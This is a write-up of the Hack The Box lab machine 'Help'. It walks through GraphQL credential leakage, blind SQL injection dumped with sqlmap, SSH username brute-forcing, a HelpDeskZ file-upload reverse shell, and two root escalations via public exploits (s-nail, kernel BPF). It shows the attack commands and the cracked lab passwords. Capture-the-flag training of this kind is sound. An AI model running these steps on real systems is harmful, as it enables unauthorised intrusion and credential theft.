# HTB Machine: Help

## Overview
Help is a Linux machine running a vulnerable HelpDeskZ application that provides multiple attack vectors for initial access. The machine features a GraphQL endpoint that leaks credentials, a blind SQL injection vulnerability, and an unauthenticated file upload in HelpDeskZ. Privilege escalation is achieved through either a vulnerable s-nail setuid binary or a kernel exploit.

## Reconnaissance

### Port Scanning
I began with a port scan to identify open services:

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.159 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.230.159 -oN nmap
```

**Open Ports:**
- **22/tcp** - OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
- **80/tcp** - Apache httpd 2.4.18
- **3000/tcp** - Node.js Express framework

I added `help.htb` to my `/etc/hosts` file:
```bash
echo "10.129.230.159 help.htb" | sudo tee -a /etc/hosts
```

### Subdomain and Vhost Enumeration
I attempted to find subdomains and vhosts, but both scans returned nothing:

```bash
ffuf -u http://FUZZ.help.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -u http://10.129.230.159 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.help.htb" -fs 11439
```

### Directory Enumeration
I ran directory brute-forcing to discover hidden paths:

```bash
feroxbuster -u http://help.htb -o feroxbuster
```

The web application was built on PHP, with several interesting endpoints discovered.

## Web Application Enumeration

### help.htb (Port 80)
The main site showed an Apache Ubuntu default page. 

<img width="1279" height="729" alt="image" src="https://github.com/user-attachments/assets/59eb143c-1253-4130-85af-d1a721468e73" />

Further exploration revealed:

- **/support** - A HelpDeskZ installation (login page)

<img width="1278" height="595" alt="image" src="https://github.com/user-attachments/assets/fec578ac-c036-4a6a-ba1e-18d9c3f024c3" />

- **/support/controllers/admin**

  <img width="633" height="432" alt="image" src="https://github.com/user-attachments/assets/88271ab8-7a57-4cfb-bf1d-a04e15d23e81" />

- **/support/controllers/staff**

  <img width="600" height="583" alt="image" src="https://github.com/user-attachments/assets/3d722a50-3f9e-4511-8c24-1e22d39f85a6" />

- **/support/README.md** - Revealed version 1.0.2

  <img width="458" height="152" alt="image" src="https://github.com/user-attachments/assets/a1dc6cbe-b359-4dab-9736-c53422f78f10" />


The login page displayed generic messages for both email and password, making username enumeration difficult.

<img width="1269" height="569" alt="image" src="https://github.com/user-attachments/assets/b60dfd48-9175-4cee-bbbe-d34fab8ec2e6" />


The **/lost_password** page included a CAPTCHA, further hindering enumeration attempts.

<img width="1279" height="649" alt="image" src="https://github.com/user-attachments/assets/8faa1955-d6e6-47a0-ad29-4383176b979b" />


The **/knowledgebase** page returned generic messages when articles weren't found.

<img width="1279" height="608" alt="image" src="https://github.com/user-attachments/assets/bb3aaaf1-6265-4ef0-aca3-a23ce5c0f070" />


The **/news** page revealed an email address: `support@help.htb`

<img width="1278" height="626" alt="image" src="https://github.com/user-attachments/assets/bcdcafaa-48df-47fe-8510-30cf3180b904" />


### Port 3000 - GraphQL Endpoint
The Node.js application on port 3000 had a GraphQL endpoint. 

<img width="574" height="195" alt="image" src="https://github.com/user-attachments/assets/e61e548c-0554-4971-860d-99411a68c247" />

By manipulating the query parameter, I discovered I could access the GraphQL introspection system:

<img width="1279" height="769" alt="image" src="https://github.com/user-attachments/assets/6bb61f75-f9df-42e1-b865-8ff50d181ef5" />

Setting an introspection query revealed the schema:

<img width="1003" height="688" alt="image" src="https://github.com/user-attachments/assets/6490ab09-d14a-458b-9060-ae3423b993f1" />


Visualizing the introspection data:

<img width="1263" height="540" alt="image" src="https://github.com/user-attachments/assets/abf8a101-43a2-4c1e-823e-011529d69fec" />

User credentials revealed:

<img width="1239" height="371" alt="image" src="https://github.com/user-attachments/assets/7302c17d-04d2-45e6-949f-8188ccf88673" />

I cracked it with crackstation:

<img width="1057" height="341" alt="image" src="https://github.com/user-attachments/assets/2e4a7eb9-d7f9-45e1-a1e7-40310f549656" />

**Password: godhelpmeplz**

## Initial Access

I discovered two distinct paths to gain initial access to the machine.

### Method 1: SQL Injection

#### Discovering the Vulnerability
After logging into the support panel with the GraphQL credentials, I created a ticket and clicked on the attachment. The URL parameter `param[]` caught my attention:
<img width="1037" height="724" alt="image" src="https://github.com/user-attachments/assets/6134b4db-92a8-49a9-8dd2-6a9371eabd57" />


I tested for SQL injection by modifying the parameter. When I changed it to `1=1`, the page loaded empty. 

<img width="1015" height="477" alt="image" src="https://github.com/user-attachments/assets/439c3c6e-e4c6-42e5-8797-8bd140d1f910" />


When I changed it to `1=2`, the page loaded 404 page, confirming a blind SQL injection vulnerability.

<img width="1006" height="589" alt="image" src="https://github.com/user-attachments/assets/89d18eb2-5d64-44a2-b022-eb51db32f782" />


#### Exploiting with SQLMap
I saved the request to a file and ran SQLMap:

```bash
sqlmap -r req.req
```
<img width="1121" height="208" alt="image" src="https://github.com/user-attachments/assets/4f375ad1-6338-41d3-849b-868c0bec2ffb" />

```bash
sqlmap -r req.req --batch --level 3 --risk 3 --dbs
```
<img width="231" height="108" alt="image" src="https://github.com/user-attachments/assets/386fced3-592b-4a5d-a1e1-3a95ff68332e" />


This revealed the `support` database. I enumerated its tables:

```bash
sqlmap -r req.req --batch --level 3 --risk 3 -D support --tables -t 10
```
<img width="244" height="374" alt="image" src="https://github.com/user-attachments/assets/85627259-4438-4057-bd9a-c0cb4774ffe3" />


The `staff` table looked promising. I dumped its contents:

```bash
sqlmap -r req.req -D support -T staff --dump
```
<img width="1269" height="202" alt="image" src="https://github.com/user-attachments/assets/4e601a82-5727-4c3b-9c26-a1d7c10edac3" />


This revealed a hashed password. I cracked it using john:

<img width="791" height="340" alt="image" src="https://github.com/user-attachments/assets/ccb6f98f-1631-4bc4-884a-0a26036ef81c" />

**Password: Welcome1**


#### Finding the Username
I needed the correct username for SSH. I used CrackMapExec to brute-force usernames:

```bash
crackmapexec ssh 10.129.230.159 -u /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -p Welcome1
```
<img width="567" height="24" alt="image" src="https://github.com/user-attachments/assets/4278ead6-d06a-47ba-92a3-a40765bb1ff4" />


This identified the username was `help`. I then connected via SSH and retrieved the user flag:

```bash
ssh help@10.129.230.159
```

### Method 2: Unauthenticated File Upload

#### Vulnerability Research
The HelpDeskZ version 1.0.2 is vulnerable to an unauthenticated file upload vulnerability. I found a public exploit:

```bash
git clone https://github.com/JubJubMcGrub/HelpDeskZ-1.0.2-File-Uplaod
```

#### Exploitation
I used a PHP reverse shell and uploaded it through the ticket system. Despite the application showing a "File is not allowed" message, the file was successfully uploaded:

<img width="747" height="86" alt="image" src="https://github.com/user-attachments/assets/938129d0-876b-4953-878b-335bdd81f84e" />

Set up listener:
```bash
nc -nvlp 9001
```
<img width="462" height="706" alt="image" src="https://github.com/user-attachments/assets/0cfe91e5-fbd0-4f35-8de7-f53602d0ae7d" />

## Privilege Escalation

### Initial Enumeration
I transferred LinPEAS to the target for automated enumeration.

**System Information:**
- OS: Ubuntu 16.04.3 LTS
- Kernel: Linux version 4.4.0-116-generic
- User: help (uid=1000) with groups: adm, cdrom, dip, www-data, plugdev, lpadmin, sambashare
- Sudo version: 1.8.16

`sudo -l` showed nothing useful.

### Method 1: s-nail Privilege Escalation (CVE-2017-5899)

#### Identifying the Vulnerability
While checking setuid binaries, I found an interesting one:

```bash
find / -perm -4000 2>/dev/null
```
<img width="1234" height="357" alt="image" src="https://github.com/user-attachments/assets/c908386e-8e3f-4cd0-9767-4c7406a6d5aa" />


Output included:```/usr/lib/s-nail/s-nail-privsep```

I checked the s-nail version:
```bash
s-nail -V
```
**Version: v14.8.6**

This version is vulnerable to CVE-2017-5899, a privilege escalation vulnerability in the setuid helper.

#### Exploitation
I found a public exploit and transferred it to the target:

```bash
# Transfer to target
scp exploit.sh help@10.129.230.159:/home/help/

# On target
chmod +x exploit.sh
./exploit.sh
```
<img width="465" height="203" alt="image" src="https://github.com/user-attachments/assets/5f134f52-71d1-46a3-b30f-3a631a137148" />

The exploit successfully executed, granting a root shell.

### Method 2: Kernel Exploit (CVE-2017-16995)

#### Identifying the Vulnerability
The kernel version (4.4.0-116-generic) is vulnerable to CVE-2017-16995, a privilege escalation vulnerability in the Linux kernel.

#### Exploitation
I downloaded the exploit from Exploit-DB:

```bash
wget https://www.exploit-db.com/exploits/44298 -O 44298.c
```

I transferred it to the target and compiled it:

```bash
scp 44298.c help@10.129.230.159:/home/help/

# On target
gcc 44298.c -o cve-2017-16995
./cve-2017-16995
```

The exploit executed successfully, spawning a root shell.

<img width="363" height="179" alt="image" src="https://github.com/user-attachments/assets/1ec219a7-4be1-40b2-b3e3-7e5c8015bf8b" />

